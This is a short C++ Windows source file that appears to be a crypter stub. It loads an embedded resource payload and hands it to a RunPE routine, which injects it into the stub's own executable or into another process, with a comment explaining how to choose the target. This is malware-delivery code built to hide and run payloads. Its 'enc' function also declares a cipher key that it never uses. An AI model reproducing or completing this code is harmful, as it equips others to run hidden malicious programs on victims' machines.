#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include "Runpe.h"

using namespace std;

int Rsize;
char* RData;

void Resource(int id)
{
	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
	HGLOBAL temp = LoadResource(NULL, hResource);
	Rsize = SizeofResource(NULL,hResource);
	RData = (char*)LockResource(temp);
}

void enc()
{
	ofstream out("In Stub.txt");
	char cipher[] = "penguin";

	for (int i = 0; i < Rsize; i++)
	{
		out << RData[i];
	}
	out.close();
}

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
Resource(1);	
enc();

LPVOID pFile;
TCHAR szFilePath[1024];

pFile = RData;
if (pFile)
{
GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
//replace process.exe with "szFilePath" if you want to inject it in the SAME file.
//or you may write the file path you want to inject in.
ExecFile(LPSTR(szFilePath), pFile); 
}
return 0;
};